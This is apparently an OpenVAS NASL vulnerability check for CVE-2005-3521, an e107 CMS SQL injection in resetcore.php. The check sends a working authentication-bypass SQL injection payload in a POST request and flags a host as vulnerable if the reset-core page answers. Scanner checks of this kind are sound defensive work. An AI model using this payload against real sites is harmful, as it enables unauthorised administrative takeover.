# OpenVAS Vulnerability Test
# $Id: e107_sql_injection.nasl 17 2013-10-27 14:01:43Z jan $
# Description: e107 resetcore.php SQL Injection
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that is prone to a SQL
injection attack. 

Description :

The remote host appears to be running e107, a web content management
system written in PHP. 

There is a flaw in the version of e107 on the remote host such that
anyone can injection SQL commands through the 'resetcore.php' script
which may be used to gain administrative access trivially.";

tag_solution = "Upgrade to e107 version 0.6173 or later.";

#  Ref: rgod

if(description)
{
 script_id(20069);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_cve_id("CVE-2005-3521");
 script_bugtraq_id(15125);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 name = "e107 resetcore.php SQL Injection";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "e107 SQL Injection";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("e107_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://retrogod.altervista.org/e107remote.html");
 script_xref(name : "URL" , value : "https://sourceforge.net/project/shownotes.php?release_id=364570");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if (!can_host_php(port:port) ) exit(0);

host = get_host_name();
variables = "a_name='%27+or+isnull%281%2F0%29%2F*&a_password=openvas&usubmit=Continue";  


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  url = string(dir, "/e107_files/resetcore.php");

  # Make sure the script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (egrep(pattern:"<input [^>]*name='a_(name|password)'", string:res)) {
    req = string("POST ",url , " HTTP/1.1\r\n", 
	      "Referer: http://", host, ":", port, req, "\r\n",  
  	      "Host: ", host, ":", port, "\r\n", 
	      "Content-Type: application/x-www-form-urlencoded\r\n", 
	      "Content-Length: ", strlen(variables), "\r\n\r\n", variables);

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if(buf == NULL)exit(0);

    if ("Reset core to default values" >< buf && "e107 resetcore></title>" >< buf)
    {
	security_hole(port);
	exit(0);
    }
  } 
}

